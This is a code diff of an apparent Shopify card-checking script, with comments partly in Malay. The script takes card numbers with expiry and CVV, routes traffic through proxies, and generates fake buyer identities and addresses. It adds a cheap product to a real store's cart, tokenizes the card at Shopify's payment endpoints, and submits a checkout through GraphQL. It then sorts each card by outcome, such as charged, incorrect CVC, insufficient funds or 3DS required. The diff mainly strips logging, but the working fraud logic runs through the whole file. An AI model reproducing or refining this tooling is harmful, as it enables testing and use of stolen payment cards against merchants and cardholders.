@@ -197,7 +197,6 @@ def get_address_for_country(country_code):
     country_code = (country_code or "US").upper()
     first, last = Utils.get_random_name()
     
-    # Kita pastikan format phone sentiasa betul untuk Shopify
     us_phones = [
         "2025550199", "3105551234", "4155559876", "6175550123",
         "9718081573", "2125559999", "7735551212", "4085556789",
@@ -213,15 +212,13 @@ def get_address_for_country(country_code):
             ("Phoenix", "AZ", "85001"),
         ]
         city, state, zip_c = random.choice(cities)
-        # Ubah format phone supaya sentiasa valid
-        phone_num = random.choice(us_phones)
         return {
             "address1": f"{random.randint(100, 9999)} {random.choice(streets)}",
             "city": city,
             "postalCode": zip_c,
             "zoneCode": state,
             "countryCode": "US",
-            "phone": f"+1{phone_num}" # Tambahan +1 depan
+            "phone": random.choice(us_phones)
         }
     elif country_code == "CA":
         streets = ["Queen St", "King St", "Yonge St", "Robson St"]
@@ -237,7 +234,7 @@ def get_address_for_country(country_code):
             "postalCode": zip_c,
             "zoneCode": state,
             "countryCode": "CA",
-            "phone": f"+1{''.join(random.choice('0123456789') for _ in range(10))}" # Tambahan +1 depan
+            "phone": f"416{''.join(random.choice('0123456789') for _ in range(7))}"
         }
     elif country_code == "GB":
         streets = ["High St", "London Rd", "Station Rd", "Church St"]
@@ -252,7 +249,7 @@ def get_address_for_country(country_code):
             "postalCode": zip_c,
             "zoneCode": state,
             "countryCode": "GB",
-            "phone": f"+44{''.join(random.choice('0123456789') for _ in range(10))}" # Tambahan +44 depan
+            "phone": f"7{''.join(random.choice('0123456789') for _ in range(9))}"
         }
     elif country_code == "AU":
         streets = ["George St", "Collins St", "Queen St"]
@@ -267,7 +264,7 @@ def get_address_for_country(country_code):
             "postalCode": zip_c,
             "zoneCode": state,
             "countryCode": "AU",
-            "phone": f"+61{''.join(random.choice('0123456789') for _ in range(9))}" # Tambahan +61 depan
+            "phone": f"04{''.join(random.choice('0123456789') for _ in range(8))}"
         }
     else:
         if country_code in book:
@@ -275,15 +272,13 @@ def get_address_for_country(country_code):
         else:
             addr = book["DEFAULT"].copy()
         addr["address1"] = f"{random.randint(10, 999)} {addr['address1']}"
-        # Pastikan phone selalu ada +1 kalau default US
-        addr["phone"] = f"+1{random.choice(us_phones)}" 
+        addr["phone"] = random.choice(us_phones)
         return addr
 
 async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
     gateway = "UNKNOWN"
     total_price = "0.00"
     currency = "USD"
-    logs = [] # KITA TAMBAH INI UNTUK REKOD LOG
     
     ourl = site_url.strip().rstrip('/')
     if not ourl.startswith('http'):
@@ -294,9 +289,6 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
     first_name = random.choice(["John", "Emily", "Alex", "Sarah", "Michael", "Jessica", "David", "Lisa"])
     last_name = random.choice(["Smith", "Johnson", "Williams", "Brown", "Garcia", "Miller", "Davis"])
     email = f"{first_name.lower()}.{last_name.lower()}{random.randint(1, 999)}@gmail.com"
-    
-    logs.append(f"[~] Initializing process for {ourl}...")
-    logs.append(f"[~] Using proxy: {proxy_str.split('@')[0].split(':')[0]}:****")
     
     bin_country = await fetch_bin_country(cc, proxy_str)
     billing_addr = get_address_for_country(bin_country)
@@ -319,24 +311,20 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
     try:
         # 1. Fetch cheapest product variant if not provided
         if not variant_id:
-            logs.append("[*] Fetching /products.json to find cheapest variant...")
             info = await fetch_products(ourl, proxy_str)
             if isinstance(info, tuple) and info[0] is False:
-                logs.append(f"[X] Product fetch failed: {info[1]}")
-                return False, info[1], gateway, total_price, currency, logs
+                return False, info[1], gateway, total_price, currency
             
             try:
                 price_val = float(info['price'])
                 if price_val > 15.00:
-                    logs.append(f"[X] Product too expensive: ${price_val:.2f}")
-                    return False, f"Site product too expensive: ${price_val:.2f}", gateway, info['price'], currency, logs
+                    return False, f"Site product too expensive: ${price_val:.2f}", gateway, info['price'], currency
             except Exception:
                 pass
                 
             variant_id = info['variant_id']
             product_link = info['link']
             total_price = info['price']
-            logs.append(f"[+] Found variant {variant_id} | Price: ${total_price}")
         else:
             product_link = f"{ourl}/products/any"
             total_price = "0.01"
@@ -349,15 +337,18 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
 
         async with AsyncSession(impersonate="chrome120", proxy=proxy, timeout=30) as session:
             # Visit product page to set cookies
-            logs.append("[*] Visiting product page & cart.js to set cookies...")
             try:
                 await session.get(product_link, headers=product_headers)
+            except Exception:
+                pass
+
+            # Hit /cart.js to initialize session
+            try:
                 await session.get(f"{ourl}/cart.js", headers=product_headers)
             except Exception:
                 pass
 
             # Add cheapest item to cart
-            logs.append("[*] Adding item to cart...")
             add_headers = {
                 **product_headers,
                 'Content-Type': 'application/x-www-form-urlencoded',
@@ -370,10 +361,9 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     json_data = {'items': [{'id': int(variant_id), 'quantity': 1}]}
                     await session.post(f"{ourl}/cart/add.js", headers={**product_headers, 'Content-Type': 'application/json'}, json=json_data)
             except Exception as e:
-                logs.append(f"[X] Cart addition failed: {str(e)}")
-                return False, f"Cart addition failed: {str(e)}", gateway, total_price, currency, logs
+                return False, f"Cart addition failed: {str(e)}", gateway, total_price, currency
 
-            # Get cart token
+            # Get cart token from /cart.js
             cart_token = ""
             try:
                 resp = await session.get(f"{ourl}/cart.js", headers=product_headers)
@@ -384,7 +374,6 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 pass
 
             # Trigger checkout redirect
-            logs.append("[*] Triggering checkout redirect...")
             checkout_headers = {
                 **product_headers,
                 'Content-Type': 'application/x-www-form-urlencoded',
@@ -398,22 +387,21 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             except Exception:
                 pass
 
-            checkout_data = {'checkout': '', 'updates[]': '1'}
+            checkout_data = {
+                'checkout': '',
+                'updates[]': '1'
+            }
             try:
                 resp = await session.post(f"{ourl}/cart", headers=checkout_headers, data=checkout_data, allow_redirects=True)
                 checkout_url = str(resp.url)
                 text = resp.text
-                logs.append(f"[+] Checkout URL reached: {checkout_url[:50]}...")
             except Exception as e:
-                logs.append(f"[X] Checkout redirect failed: {str(e)}")
-                return False, f"Checkout redirect failed: {str(e)}", gateway, total_price, currency, logs
+                return False, f"Checkout redirect failed: {str(e)}", gateway, total_price, currency
 
             if 'login' in checkout_url.lower():
-                logs.append("[X] Site requires login!")
-                return False, "Site requires login!", gateway, total_price, currency, logs
+                return False, "Site requires login!", gateway, total_price, currency
 
-            # Extract tokens
-            logs.append("[*] Extracting checkout session tokens...")
+            # Extract checkout and session tokens
             sst = None
             sst_match = re.search(r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"', text)
             if sst_match:
@@ -428,28 +416,27 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                           extract_between(text, '"sessionToken":"', '"')
 
             if not sst:
-                logs.append("[X] Failed to get session token")
-                return False, "Failed to get session token", gateway, total_price, currency, logs
+                return False, "Failed to get session token", gateway, total_price, currency
 
+            # Extract queueToken, stableId, paymentMethodIdentifier
             queue_token = extract_between(text, 'queueToken&quot;:&quot;', '&quot;') or extract_between(text, '"queueToken":"', '"') or ""
             stable_id = extract_between(text, 'stableId&quot;:&quot;', '&quot;') or extract_between(text, '"stableId":"', '"') or "1"
             paymentMethodIdentifier = extract_between(text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;') or extract_between(text, '"paymentMethodIdentifier":"', '"') or "credit_card"
-            
+
+            # Parse currency and price from HTML
             currency = 'USD'
             if 'currencyCode&quot;:&quot;' in text:
                 currency = extract_between(text, 'currencyCode&quot;:&quot;', '&quot;') or 'USD'
             elif '"currencyCode":"' in text:
                 currency = extract_between(text, '"currencyCode":"', '"') or 'USD'
-            
+
+            # Try to parse the checkout token (e.g. from /checkouts/cn/xxxxx)
             attempt_token_match = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
             c_token = attempt_token_match.group(1) if attempt_token_match else checkout_url.split('/')[-1].split('?')[0]
             if not c_token or len(c_token) < 5 or 'checkout' in c_token:
                 c_token = cart_token or "1"
-                
-            logs.append(f"[+] Tokens extracted successfully (Currency: {currency})")
 
-            # 2. Tokenize card
-            logs.append("[*] Tokenizing card at deposit.us.shopifycs.com...")
+            # 2. Tokenize card at deposit.us.shopifycs.com/sessions
             session_endpoints = [
                 "https://deposit.us.shopifycs.com/sessions",
                 "https://checkout.pci.shopifyinc.com/sessions",
@@ -485,7 +472,6 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                         token_data = token_resp.json()
                         sessionid = token_data.get('id')
                         if sessionid:
-                            logs.append(f"[+] Card tokenized successfully (Session ID received).")
                             break
                     else:
                         token_error = f"Status {token_resp.status_code}: {resp_body}"
@@ -493,11 +479,9 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     token_error = str(e)
 
             if not sessionid:
-                logs.append(f"[X] Tokenization failed: {token_error}")
-                return False, f"Tokenization failed: {token_error}", gateway, total_price, currency, logs
+                return False, f"Tokenization failed: {token_error}", gateway, total_price, currency
 
             # 3. Submit GraphQL payment directly
-            logs.append("[*] Submitting GraphQL payment mutation...")
             graphql_url = f'{ourl}/checkouts/unstable/graphql'
             graphql_headers = {
                 'Accept': 'application/json',
@@ -518,9 +502,14 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 'variables': {
                     'input': {
                         'checkpointData': None,
-                        'sessionInput': {'sessionToken': sst},
+                        'sessionInput': {
+                            'sessionToken': sst,
+                        },
                         'queueToken': queue_token,
-                        'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
+                        'discounts': {
+                            'lines': [],
+                            'acceptUnexpectedDiscounts': True,
+                        },
                         'delivery': {
                             'deliveryLines': [
                                 {
@@ -531,12 +520,21 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                                         },
                                         'options': {},
                                     },
-                                    'targetMerchandiseLines': {'lines': [{'stableId': stable_id}]},
+                                    'targetMerchandiseLines': {
+                                        'lines': [{'stableId': stable_id}],
+                                    },
                                     'destination': {
                                         'streetAddress': {
-                                            'address1': s_add1, 'address2': '', 'city': s_city, 'countryCode': s_country_code,
-                                            'postalCode': s_zip_code, 'company': '', 'firstName': first_name, 'lastName': last_name,
-                                            'zoneCode': s_state_short, 'phone': s_phone,
+                                            'address1': s_add1,
+                                            'address2': '',
+                                            'city': s_city,
+                                            'countryCode': s_country_code,
+                                            'postalCode': s_zip_code,
+                                            'company': '',
+                                            'firstName': first_name,
+                                            'lastName': last_name,
+                                            'zoneCode': s_state_short,
+                                            'phone': s_phone,
                                         },
                                     },
                                     'deliveryMethodTypes': ['SHIPPING'],
@@ -556,7 +554,9 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                                         'productVariantReference': {
                                             'id': f'gid://shopify/ProductVariantMerchandise/{variant_id}',
                                             'variantId': f'gid://shopify/ProductVariant/{variant_id}',
-                                            'properties': [], 'sellingPlanId': None, 'sellingPlanDigest': None,
+                                            'properties': [],
+                                            'sellingPlanId': None,
+                                            'sellingPlanDigest': None,
                                         },
                                     },
                                     'quantity': {'items': {'value': 1}},
@@ -576,9 +576,16 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                                             'sessionId': sessionid,
                                             'billingAddress': {
                                                 'streetAddress': {
-                                                    'address1': b_add1, 'address2': '', 'city': b_city, 'countryCode': b_country_code,
-                                                    'postalCode': b_zip_code, 'company': '', 'firstName': first_name, 'lastName': last_name,
-                                                    'zoneCode': b_state_short, 'phone': b_phone,
+                                                    'address1': b_add1,
+                                                    'address2': '',
+                                                    'city': b_city,
+                                                    'countryCode': b_country_code,
+                                                    'postalCode': b_zip_code,
+                                                    'company': '',
+                                                    'firstName': first_name,
+                                                    'lastName': last_name,
+                                                    'zoneCode': b_state_short,
+                                                    'phone': b_phone,
                                                 },
                                             },
                                             'cardSource': None,
@@ -590,15 +597,30 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                             ],
                             'billingAddress': {
                                 'streetAddress': {
-                                    'address1': b_add1, 'address2': '', 'city': b_city, 'countryCode': b_country_code,
-                                    'postalCode': b_zip_code, 'company': '', 'firstName': first_name, 'lastName': last_name,
-                                    'zoneCode': b_state_short, 'phone': b_phone,
+                                    'address1': b_add1,
+                                    'address2': '',
+                                    'city': b_city,
+                                    'countryCode': b_country_code,
+                                    'postalCode': b_zip_code,
+                                    'company': '',
+                                    'firstName': first_name,
+                                    'lastName': last_name,
+                                    'zoneCode': b_state_short,
+                                    'phone': b_phone,
                                 },
                             },
                         },
                         'buyerIdentity': {
-                            'buyerIdentity': {'presentmentCurrency': currency, 'countryCode': s_country_code},
-                            'contactInfoV2': {'emailOrSms': {'value': email, 'emailOrSmsChanged': False}},
+                            'buyerIdentity': {
+                                'presentmentCurrency': currency,
+                                'countryCode': s_country_code,
+                            },
+                            'contactInfoV2': {
+                                'emailOrSms': {
+                                    'value': email,
+                                    'emailOrSmsChanged': False,
+                                },
+                            },
                             'marketingConsent': [{'email': {'value': email}}],
                             'shopPayOptInPhone': {'countryCode': s_country_code},
                         },
@@ -614,14 +636,20 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                         'localizationExtension': {'fields': []},
                         'nonNegotiableTerms': None,
                         'scriptFingerprint': {
-                            'signature': None, 'signatureUuid': None, 'lineItemScriptChanges': [],
-                            'paymentScriptChanges': [], 'shippingScriptChanges': [],
+                            'signature': None,
+                            'signatureUuid': None,
+                            'lineItemScriptChanges': [],
+                            'paymentScriptChanges': [],
+                            'shippingScriptChanges': [],
                         },
                         'optionalDuties': {'buyerRefusesDuties': False},
                     },
                     'attemptToken': f'{c_token}-{random.random()}',
                     'metafields': [],
-                    'analytics': {'requestUrl': f'{ourl}/checkouts/cn/{c_token}', 'pageId': random_page_id},
+                    'analytics': {
+                        'requestUrl': f'{ourl}/checkouts/cn/{c_token}',
+                        'pageId': random_page_id,
+                    },
                 },
                 'operationName': 'SubmitForCompletion',
             }
@@ -634,19 +662,16 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                         if submit_attempt == 0:
                             await asyncio.sleep(2)
                             continue
-                        logs.append(f"[X] GraphQL submission failed: Status {graphql_resp.status_code}")
-                        return False, f"GraphQL submission failed: Status {graphql_resp.status_code}", gateway, total_price, currency, logs
+                        return False, f"GraphQL submission failed: Status {graphql_resp.status_code}", gateway, total_price, currency
                     
                     result_data = graphql_resp.json()
                     completion = result_data.get('data', {}).get('submitForCompletion', {})
                     
                     if completion.get('__typename') == 'CheckpointDenied':
-                        logs.append("[X] Checkpoint Denied (Cloudflare/Captcha).")
-                        return True, "CARD_DECLINED", gateway, total_price, currency, logs
+                        return True, "CARD_DECLINED", gateway, total_price, currency
                         
                     if completion.get('receipt'):
                         receipt_id = completion['receipt'].get('id')
-                        logs.append(f"[+] Receipt ID generated: {receipt_id}")
                     
                     if completion.get('errors'):
                         errors = completion['errors']
@@ -660,27 +685,26 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                         
                         non_soft_errors = [code for code in error_codes if code not in soft_errors]
                         if non_soft_errors:
-                            logs.append(f"[!] Gateway returned errors: {', '.join(non_soft_errors)}")
-                            return True, ', '.join(non_soft_errors), gateway, total_price, currency, logs
+                            return True, ', '.join(non_soft_errors), gateway, total_price, currency
                     
                     if completion.get('reason'):
-                        logs.append(f"[!] Submission rejected. Reason: {completion.get('reason')}")
-                        return True, completion['reason'], gateway, total_price, currency, logs
+                        return True, completion['reason'], gateway, total_price, currency
                     
                     break
                 except Exception as e:
                     if submit_attempt == 0:
                         await asyncio.sleep(2)
                         continue
-                    logs.append(f"[X] GraphQL submission exception: {str(e)}")
-                    return False, f"GraphQL submission failed: {str(e)}", gateway, total_price, currency, logs
+                    return False, f"GraphQL submission failed: {str(e)}", gateway, total_price, currency
 
             # 4. Poll for receipt status
             if receipt_id:
-                logs.append("[*] Polling for receipt status (Waiting for bank response)...")
                 poll_payload = {
                     'query': QUERY_POLL,
-                    'variables': {'receiptId': receipt_id, 'sessionToken': sst},
+                    'variables': {
+                        'receiptId': receipt_id,
+                        'sessionToken': sst,
+                    },
                     'operationName': 'PollForReceipt'
                 }
                 
@@ -694,22 +718,18 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                             typename = receipt.get('__typename')
                             
                             if typename == 'ProcessedReceipt' or 'orderIdentity' in receipt:
-                                logs.append("[+] ORDER PLACED SUCCESSFULLY! (Charged)")
-                                return True, "ORDER_PLACED", gateway, total_price, currency, logs
+                                return True, "ORDER_PLACED", gateway, total_price, currency
                             elif typename == 'ActionRequiredReceipt':
-                                logs.append("[!] Action Required (3DS / OTP).")
-                                return True, "OTP_REQUIRED", gateway, total_price, currency, logs
+                                return True, "OTP_REQUIRED", gateway, total_price, currency
                             elif typename == 'FailedReceipt':
                                 code = receipt.get('processingError', {}).get('code') or \
                                        receipt.get('processingError', {}).get('messageUntranslated') or \
                                        "CARD_DECLINED"
-                                logs.append(f"[X] Payment Failed. Code: {code}")
-                                return True, code, gateway, total_price, currency, logs
+                                return True, code, gateway, total_price, currency
                     except Exception:
                         pass
 
             # 5. Fallback final check
-            logs.append("[*] Doing fallback final check at checkout URL...")
             try:
                 checkout_url_final = f"{ourl}/checkout?from_processing_page=1&validate=true"
                 final_resp = await session.get(checkout_url_final, headers=product_headers, timeout=10)
@@ -717,13 +737,11 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 final_text = final_resp.text
                 
                 if "/thank" in final_url.lower() or "/orders/" in final_url:
-                    logs.append("[+] ORDER PLACED SUCCESSFULLY! (Charged)")
-                    return True, "ORDER_PLACED", gateway, total_price, currency, logs
+                    return True, "ORDER_PLACED", gateway, total_price, currency
                 
                 final_lower = final_text.lower()
                 if "challenge" in final_url.lower() or "challenge" in final_lower or "recaptcha" in final_lower or "hcaptcha" in final_lower:
-                    logs.append("[X] Captcha/Challenge detected.")
-                    return True, "CARD_DECLINED", gateway, total_price, currency, logs
+                    return True, "CARD_DECLINED", gateway, total_price, currency
                 
                 is_3ds = (
                     "three_d_secure" in final_url.lower() or 
@@ -734,27 +752,21 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 )
                 
                 if "insufficient funds" in final_lower or "insufficient_funds" in final_lower:
-                    logs.append("[X] Insufficient Funds.")
-                    return True, "INSUFFICIENT_FUNDS", gateway, total_price, currency, logs
+                    return True, "INSUFFICIENT_FUNDS", gateway, total_price, currency
                 elif "security code is incorrect" in final_lower or "cvv_gateway_error" in final_lower or "incorrect cvv" in final_lower:
-                    logs.append("[X] Incorrect CVC.")
-                    return True, "INCORRECT_CVC", gateway, total_price, currency, logs
+                    return True, "INCORRECT_CVC", gateway, total_price, currency
                 elif is_3ds:
-                    logs.append("[!] 3DS / OTP Required.")
-                    return True, "OTP_REQUIRED", gateway, total_price, currency, logs
+                    return True, "OTP_REQUIRED", gateway, total_price, currency
                 elif "declined" in final_lower or "failed" in final_lower:
                     code = extract_between(final_text, '{"code":"', '"')
-                    logs.append(f"[X] Card Declined. Code: {code}")
-                    return True, code if code else "CARD_DECLINED", gateway, total_price, currency, logs
+                    return True, code if code else "CARD_DECLINED", gateway, total_price, currency
             except Exception:
                 pass
 
-            logs.append("[X] Card Declined (Default fallback).")
-            return True, "CARD_DECLINED", gateway, total_price, currency, logs
+            return True, "CARD_DECLINED", gateway, total_price, currency
 
     except Exception as e:
-        logs.append(f"[X] Error Processing Card: {str(e)}")
-        return False, f"Error Processing Card: {str(e)}", gateway, total_price, currency, logs
+        return False, f"Error Processing Card: {str(e)}", gateway, total_price, currency
 
 def _classify_response(response_text: str) -> tuple:
     resp = str(response_text).strip()
@@ -874,24 +886,23 @@ async def shopify_auto_check(card_str: str, site_url: str, proxy_str: str = None
         if len(ano) == 2:
             ano = "20" + ano
     else:
-        return "ERROR", "Invalid card format", "-", []
+        return "ERROR", "Invalid card format", "-"
 
     site = site_url.strip().rstrip("/")
     if not site.startswith("http"):
         site = "https://" + site
 
     try:
-        # PERHATIAN: process_card sekarang pulangkan 6 benda (termasuk logs)
-        success, message, gateway, price, currency, logs = await process_card(
+        success, message, gateway, price, currency = await process_card(
             cc=cc, mes=mes, ano=ano, cvv=cvv, site_url=site, proxy_str=proxy_str
         )
         
         status, _, _ = _classify_response(message)
         
         if not success and status not in ("Charged", "Approved", "3DS", "Dead"):
-            return "Error", message, price, logs
+            return "Error", message, price
             
-        return status, message, price, logs
+        return status, message, price
 
     except Exception as e:
-        return "ERROR", str(e)[:150], "-", []
+        return "ERROR", str(e)[:150], "-"
